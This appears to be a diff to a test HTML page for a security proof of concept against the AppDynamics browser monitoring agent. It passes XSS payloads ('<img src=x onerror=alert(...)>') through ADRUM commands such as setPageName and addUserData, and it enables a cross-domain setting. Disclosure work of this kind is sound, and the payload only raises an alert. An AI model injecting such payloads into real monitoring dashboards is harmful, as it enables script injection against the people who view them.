@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html>
+  <title>&lt;img src=x onerror=alert(1)&gt;&lt;/img&gt;</title>
   <head>
     <script charset='UTF-8'>
     window['adrum-start-time'] = new Date().getTime();
@@ -9,10 +10,16 @@
         config.adrumExtUrlHttps = 'https://cdn.appdynamics.com';
         config.beaconUrlHttp = 'http://shadow-master-eum-col.appdynamics.com';
         config.beaconUrlHttps = 'https://shadow-master-eum-col.appdynamics.com';
-        config.xd = {enable : false};
+        config.xd = {enable : true};
     })(window['adrum-config'] || (window['adrum-config'] = {}));
     </script>
     <script src='https://cdn.appdynamics.com/adrum/adrum-latest.js'></script>
+    <script>
+      ADRUM.command("setPageName", "<img src=x onerror=alert('NCC')>");
+      ADRUM.command("setVirtualPageName", "<img src=x onerror=alert('NCC')>");
+      ADRUM.command("addUserData", "<img src=x onerror=alert('NCC')>",
+        "<img src=x onerror=alert('NCC')>");
+    </script>
   </head>
   <body>
     <h1>Hello, world!</h1>
